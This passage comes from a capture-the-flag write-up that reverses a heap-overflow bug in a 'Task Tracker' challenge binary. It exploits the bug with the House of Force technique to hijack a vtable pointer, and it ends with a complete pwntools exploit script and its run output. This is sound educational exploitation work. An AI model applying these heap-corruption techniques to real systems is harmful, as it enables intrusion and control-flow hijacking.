  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-10h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">chunk_count</span> <span class="o">&gt;</span> <span class="mi">49</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">output</span><span class="p">(</span><span class="s">"All tasks have been tracked. Call the Emergency Meeting!"</span><span class="p">,</span> <span class="n">a2</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Please enter the length of task name:"</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
    <span class="n">size</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">size</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">output</span><span class="p">(</span><span class="s">"Are you an imposter?"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
      <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">49</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">heap_chunks</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">]</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">heap_chunks</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Please enter the name of task:"</span><span class="p">);</span>
        <span class="o">*</span><span class="p">(</span><span class="n">heap_chunks</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">heap_chunks</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">],</span> <span class="n">size</span><span class="p">))</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="o">++</span><span class="n">chunk_count</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="nl">end:</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The function first checks if <code class="language-plaintext highlighter-rouge">chunk_count</code>, the number of allocated chunks, exceeds 49. If it does not, we are asked for a length, which will be the size of the newly allocated chunk:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="s">"Please enter the length of task name:"</span><span class="p">);</span>
<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
<span class="n">size</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</code></pre></div></div>

<p>The function then looks for an unused index in <code class="language-plaintext highlighter-rouge">heap_chunks</code>, and stores the pointer returned by <code class="language-plaintext highlighter-rouge">malloc()</code> at that index. Next, we are asked for the “name of task”, which will be read and stored in the newly allocated heap chunk.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">49</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">heap_chunks</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">]</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">heap_chunks</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Please enter the name of task:"</span><span class="p">);</span>
        <span class="o">*</span><span class="p">(</span><span class="n">heap_chunks</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">heap_chunks</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">],</span> <span class="n">size</span><span class="p">))</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="o">++</span><span class="n">chunk_count</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>From reversing <code class="language-plaintext highlighter-rouge">add()</code>, we note that we are able to:</p>
<ul>
  <li>Allocate a heap chunk of any size</li>
  <li>Allocate up to 50 chunks</li>
</ul>

<p>Next, we take a look at the code of <code class="language-plaintext highlighter-rouge">edit()</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="n">__int64</span> <span class="n">a2</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">index</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-2Ch]</span>
  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-28h]</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-20h] BYREF</span>
  <span class="kt">char</span> <span class="n">buf_2</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-10h] BYREF</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">chunk_count</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Please enter the index of the task you want to change:"</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
    <span class="n">index</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">heap_chunks</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">index</span><span class="p">]</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Enter the length of task name:"</span><span class="p">);</span>
      <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf_2</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
      <span class="n">size</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf_2</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Enter the new task name:"</span><span class="p">);</span>
      <span class="o">*</span><span class="p">(</span><span class="n">heap_chunks</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">index</span><span class="p">]</span> <span class="o">+</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">heap_chunks</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">index</span><span class="p">],</span> <span class="n">size</span><span class="p">))</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="n">output</span><span class="p">(</span><span class="s">"That is what an imposter would say."</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">output</span><span class="p">(</span><span class="s">"Are you doing your tasks?"</span><span class="p">,</span> <span class="n">a2</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The function first checks if a chunk is allocated using <code class="language-plaintext highlighter-rouge">chunk_count</code>. If so, it asks for the index of the chunk we wish to edit:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="s">"Please enter the index of the task you want to change:"</span><span class="p">);</span>
<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
<span class="n">index</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</code></pre></div></div>

<p>The vulnerability lies in the following part of the code. The program checks if the index we entered is valid using <code class="language-plaintext highlighter-rouge">heap_chunks</code>. Next, we are once again asked for a length, followed by new data we wish to write into the chunk.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="n">heap_chunks</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">index</span><span class="p">]</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter the length of task name:"</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf_2</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
    <span class="n">size</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf_2</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter the new task name:"</span><span class="p">);</span>
    <span class="o">*</span><span class="p">(</span><span class="n">heap_chunks</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">index</span><span class="p">]</span> <span class="o">+</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">heap_chunks</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">index</span><span class="p">],</span> <span class="n">size</span><span class="p">))</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Notice how the function does not check if <code class="language-plaintext highlighter-rouge">size</code> is smaller or equal to the actual size of the allocated chunk. This allows us to cause a heap overflow and overwrite other chunks or data on the heap.</p>

<p>Also, while I was halfway into solving the challenge, I also noticed there was a function to print the flag at <code class="language-plaintext highlighter-rouge">0x400D51</code>, which was very useful:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">__noreturn</span> <span class="nf">print_flag</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">f</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-54h]</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">72</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-50h] BYREF</span>

  <span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x40uLL</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p><strong>Exploitation: House of Force</strong><br />
From reversing the binary, we know that we can:</p>
<ul>
  <li>Overwrite any data on the heap using the heap overflow</li>
  <li>Allocate a heap chunk of any size</li>
  <li>Allocate up to 50 chunks</li>
</ul>

<p>Using this, we will be able to write data to any address relative to the heap using the <strong>House of Force</strong>. I won’t explain the <strong>House of Force</strong> in detail, but you can refer to these explanations should you wish to understand better:</p>
<ul>
  <li><a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_force">heap-exploitation: House of Force</a></li>
  <li><a href="https://www.lazenca.net/pages/viewpage.action?pageId=51970155">lazenca TechNote: The House of Force</a></li>
</ul>

<p>Usually, <strong>House of Force</strong> would require a heap address leak to gain an arbitrary write. However, in this challenge, we can simply write the address of <code class="language-plaintext highlighter-rouge">print_flag()</code> into <code class="language-plaintext highlighter-rouge">vtable</code>, which is stored on the heap. This does not require a heap address leak, as the address we want to overwrite (<code class="language-plaintext highlighter-rouge">vtable</code>) is relative to the chunks allocated by us.</p>

<p>The exploitation process is as follows:</p>
<ol>
  <li>Using the heap overflow, overwrite the <code class="language-plaintext highlighter-rouge">top_chunk</code> with <code class="language-plaintext highlighter-rouge">0xffffffffffffffff</code>. This would allow us to allocate a chunk with an absurdly large size.</li>
  <li>Allocate a chunk with a size of <code class="language-plaintext highlighter-rouge">offset</code>. As the address of <code class="language-plaintext highlighter-rouge">vtable</code> is less than the address of the <code class="language-plaintext highlighter-rouge">top_chunk</code>, <code class="language-plaintext highlighter-rouge">offset</code> is calculated by: <code class="language-plaintext highlighter-rouge">offset = -(top_chunk - target + chunk_size)</code>. <code class="language-plaintext highlighter-rouge">chunk_size</code> refers to the size of the final chunk we will allocate.</li>
  <li>Allocate a final chunk, this chunk will be allocated at the address of <code class="language-plaintext highlighter-rouge">target</code>.</li>
  <li>Using <code class="language-plaintext highlighter-rouge">edit()</code>, overwrite the one of the <code class="language-plaintext highlighter-rouge">vtable</code> pointers with <code class="language-plaintext highlighter-rouge">print_flag()</code>.</li>
  <li>Call <code class="language-plaintext highlighter-rouge">print_flag()</code> normally using the menu options.</li>
</ol>

<p>To overwrite the <code class="language-plaintext highlighter-rouge">top_chunk</code>, we simply allocate a chunk of size 8 and use <code class="language-plaintext highlighter-rouge">edit()</code> to overflow the <code class="language-plaintext highlighter-rouge">top_chunk</code>.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Overwrite top chunk size with 0xffffffffffffffff
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>

<p>We then calculate the <code class="language-plaintext highlighter-rouge">offset</code> with the method mentioned above. The addresses of <code class="language-plaintext highlighter-rouge">vtable</code> and <code class="language-plaintext highlighter-rouge">top_chunk</code> can be obtained by analyzing the heap using <code class="language-plaintext highlighter-rouge">gdb</code>. Note that their values will be different every run.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Calculating the value of offset    
</span><span class="n">target</span> <span class="o">=</span> <span class="mh">0x1802860</span>  <span class="c1"># Address of vtable
</span><span class="n">top_chunk</span> <span class="o">=</span> <span class="mh">0x18028f0</span>
<span class="n">offset</span> <span class="o">=</span> <span class="n">top_chunk</span> <span class="o">-</span> <span class="n">target</span> <span class="o">+</span> <span class="mi">8</span>
</code></pre></div></div>

<p>The chunk with size <code class="language-plaintext highlighter-rouge">offset</code> is then allocated:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Allocate absurdly large chunk, which will wrap around memory
</span><span class="n">malloc</span><span class="p">(</span><span class="o">-</span><span class="n">offset</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">))</span>
</code></pre></div></div>

<p>The final chunk we allocate will be at the address of <code class="language-plaintext highlighter-rouge">vtable</code>. This is the chunk we use to overwrite one of the <code class="language-plaintext highlighter-rouge">vtable</code> pointers.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Allocate chunk at vtable
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
</code></pre></div></div>

<p>We edit the final chunk and overwrite the value of the first <code class="language-plaintext highlighter-rouge">vtable</code> pointer, which is the function that is called when we select <code class="language-plaintext highlighter-rouge">1</code> on the menu.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Overwrite first option in vtable with print_flag()
</span><span class="n">print_flag</span> <span class="o">=</span> <span class="mh">0x0000000000400D51</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">56</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">print_flag</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>

<p>Lastly, we select <code class="language-plaintext highlighter-rouge">1</code>, which causes the program to call <code class="language-plaintext highlighter-rouge">print_flag()</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Calling print_flag()
</span><span class="n">sla</span><span class="p">(</span><span class="s">'Your choice:'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
</code></pre></div></div>

<p>Running the exploit prints the flag successfully:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">python</span> <span class="n">solve</span><span class="p">.</span><span class="n">py</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s">'/mnt/c/Users/brand/Downloads/Task Tracker/tasktracker'</span>
    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="p">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">local</span> <span class="n">process</span> <span class="s">'/mnt/c/Users/brand/Downloads/Task Tracker/tasktracker'</span><span class="p">:</span> <span class="n">pid</span> <span class="mi">1782</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Paused</span> <span class="p">(</span><span class="n">press</span> <span class="nb">any</span> <span class="n">to</span> <span class="k">continue</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
<span class="o">******************************************************************************</span>
<span class="n">Secure</span> <span class="n">TaskTracker</span><span class="err">!</span> <span class="n">Better</span> <span class="n">than</span> <span class="n">Medbay</span> <span class="n">Scan</span> <span class="n">at</span> <span class="n">identifying</span> <span class="n">imposters</span><span class="err">!</span>
<span class="o">******************************************************************************</span>
<span class="mf">1.</span><span class="n">Show</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">tasks</span>
<span class="mf">2.</span><span class="n">Add</span> <span class="n">a</span> <span class="n">task</span>
<span class="mf">3.</span><span class="n">Change</span> <span class="n">a</span> <span class="n">task</span> <span class="p">(</span><span class="n">That</span> <span class="ow">is</span> <span class="n">what</span> <span class="n">an</span> <span class="n">imposter</span> <span class="n">would</span> <span class="n">do</span> <span class="p">:</span><span class="n">o</span><span class="p">)</span>
<span class="mf">4.</span><span class="n">Activate</span> <span class="n">Communications</span>
<span class="mf">5.</span><span class="n">Call</span> <span class="n">Emergency</span> <span class="n">Meeting</span>
<span class="o">******************************************************************************</span>
<span class="n">Your</span> <span class="n">choice</span><span class="p">:[</span><span class="o">*</span><span class="p">]</span> <span class="n">Process</span> <span class="s">'/mnt/c/Users/brand/Downloads/Task Tracker/tasktracker'</span> <span class="n">stopped</span> <span class="k">with</span> <span class="nb">exit</span> <span class="n">code</span> <span class="mi">0</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">1782</span><span class="p">)</span>
<span class="n">DSO</span><span class="o">-</span><span class="n">NUS</span><span class="p">{</span><span class="n">fake_flag</span><span class="p">}</span>
</code></pre></div></div>

<p>Full exploit code:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./tasktracker"</span><span class="p">)</span>
<span class="n">host</span> <span class="o">=</span> <span class="s">"ctf-85ib.balancedcompo.site"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">9997</span>

<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'Your choice:'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'Please enter the length of task name:'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'Please enter the name of task:'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'Your choice:'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'Please enter the index of the task you want to change:'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'Enter the length of task name:'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'Enter the new task name:'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="c1"># Overwrite top chunk size with 0xffffffffffffffff
</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

    <span class="c1"># Calculating the value of offset    
</span>    <span class="n">target</span> <span class="o">=</span> <span class="mh">0x1802860</span>
    <span class="n">top_chunk</span> <span class="o">=</span> <span class="mh">0x18028f0</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="n">top_chunk</span> <span class="o">-</span> <span class="n">target</span> <span class="o">+</span> <span class="mi">8</span>

    <span class="c1"># Allocate absurdly large chunk, which will wrap around memory
</span>    <span class="n">malloc</span><span class="p">(</span><span class="o">-</span><span class="n">offset</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">))</span>

    <span class="c1"># Allocate chunk at vtable
</span>    <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>
    
    <span class="c1"># Overwrite first option in vtable with print_flag()
</span>    <span class="n">print_flag</span> <span class="o">=</span> <span class="mh">0x0000000000400D51</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">56</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">print_flag</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

    <span class="c1"># Calling print_flag()
</span>    <span class="n">sla</span><span class="p">(</span><span class="s">'Your choice:'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>

    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>

    <span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"remote"</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
        <span class="n">pause</span><span class="p">()</span>

    <span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
    <span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

    <span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</code></pre></div></div>
